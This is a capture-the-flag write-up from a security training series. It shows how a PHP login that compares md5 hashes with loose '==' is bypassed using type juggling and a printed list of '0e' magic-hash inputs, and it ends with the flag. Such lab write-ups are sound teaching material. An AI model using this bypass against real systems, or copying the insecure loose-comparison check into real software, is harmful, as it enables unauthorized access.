---
Name: "Defaced Website"
Category: "Security Summer School"
Difficulty: "Medium"
Description: "Analyzing a defaced site to identify and exploit the exposed weakness."
---

# Defaced Website
We see an image that does not exist in the page source
```html
	<img src="img/d3f4c3d.png" style="height:1px;" />
```

Replacing the numbers with letter we get /defaced.png which works

![defaced](../../../public/images/security_summer_school/08_exotic_attacks/defaced.png)

Likely it looks like:
```php
<?php
require("flag.php");

$sec_pass = "0e413229387827631581229643338212";

if (isset($_POST['username']) && isset($_POST['password'])) {
    if (md5($_POST['password'] . $_POST['username']) == $sec_pass) {
        $message = $flag;
    } else {
        $error = "Invalid username/password!";
    }
}
?>
```

The application computes:
```
md5($password . $username)
```

It compares the result with
```
"0e413229387827631581229643338212"
```

using loose comparison (==), not strict comparison (===)

PHP performs type juggling with ==

Strings of the form
```
0e12345678901234567890
```

are interpreted as scientific notation:
```
0 × 10^12345678901234567890
```

which is simply the numeric value 0

Therefore,
```
"0e413229387827631581229643338212" == "0e462097431906509019562988736854"
```

Evaluates to
```
0 == 0
```
which is true

We have to find a combination of username + password whose hash starts with 0e, luckily we have a list of md5 magic hashes, https://github.com/spaze/hashes/blob/master/md5.md
```txt
240610708:0e462097431906509019562988736854
QLTHNDT:0e405967825401955372549139051580
QNKCDZO:0e830400451993494058024219903391
PJNPDWY:0e291529052894702774557631701704
NWWKITQ:0e763082070976038347657360817689
NOOPCJF:0e818888003657176127862245791911
MMHUWUV:0e701732711630150438129209816536
MAUXXQC:0e478478466848439040434801845361
IHKFRNS:0e256160682445802696926137988570
GZECLQZ:0e537612333747236407713628225676
```

Using the first one we get the flag
```
password = 2406
username = 10708
```

```
SSS{th4nk_y0u_s0_much_f0r_g3tt1ng_my_w3bs1t3_b4ck_d4rl1ng}
```

